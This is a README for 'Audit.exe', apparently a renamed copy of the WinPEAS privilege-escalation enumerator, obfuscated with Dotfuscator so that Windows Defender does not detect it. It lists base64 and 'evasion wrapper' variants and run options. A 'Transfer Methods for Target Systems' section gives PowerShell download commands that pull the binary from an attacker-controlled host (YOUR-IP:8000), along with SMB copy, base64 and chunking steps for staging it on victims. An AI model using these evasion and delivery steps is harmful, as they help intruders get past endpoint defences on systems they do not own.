# Audit.exe 


This version of a tool that is obfuscated using Dotfuscator and is currently not detected by Windows Defender

This folder has the following contents
```
- Audit.exe      - modified metadata
- Audit.ps1      - B64 encoded exe with modified metadata in basic evasion wrapper 
- Audit64        - B64 encoded exe with modified metadata
- Audit-orig.exe - Basic Obfuscated Audit tool
```

## 🚀 How to Use Obfuscated Audit

```
Basic Usage:
# Run basic scan
.\Audit.exe

# Run with output to file
.\Audit.exe > results.txt

# Run specific checks only
.\Audit.exe systeminfo
```

### Advanced Usage Options:
```
# Fast scan (reduced checks)
.\Audit.exe fast

# Specific category checks
.\Audit.exe systeminfo,userinfo,processinfo

# Quiet mode (less output)
.\Audit.exe quiet

# Enable colors in Windows Terminal
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
.\Audit.exe
```


## 🎯 Transfer Methods for Target Systems

### Method 1: PowerShell Download
```
IEX(New-Object Net.WebClient).DownloadFile('http://YOUR-IP:8000/Audit.exe','Audit.exe')
```

### Method 2: Base64 Transfer
```
$fileBytes = [System.IO.File]::ReadAllBytes("C:\Users\AKend\Downloads\ObfuscatedWinPEAS\mypea\Audit.exe")
$base64 = [Convert]::ToBase64String($fileBytes)
$base64 | Out-File SymAudit.txt
```

```
$base64 = Get-Content Audit.txt
$bytes = [Convert]::FromBase64String($base64)
[IO.File]::WriteAllBytes("Audit.exe", $bytes)
.\Audit.exe
```

### Method 3: SMB Share
```
copy \\YOUR-IP\share\Audit.exe .
.\Audit.exe
```


## Method 4: Chunking
```
# Method B: Split into multiple files
$chunkSize = 1MB
$chunks = [math]::Ceiling($bytes.Length / $chunkSize)
for ($i = 0; $i -lt $chunks; $i++) {
    $start = $i * $chunkSize
    $end = [math]::Min($start + $chunkSize - 1, $bytes.Length - 1)
    $chunk = $bytes[$start..$end]
    [System.IO.File]::WriteAllBytes("part_$i.dat", $chunk)
}
```
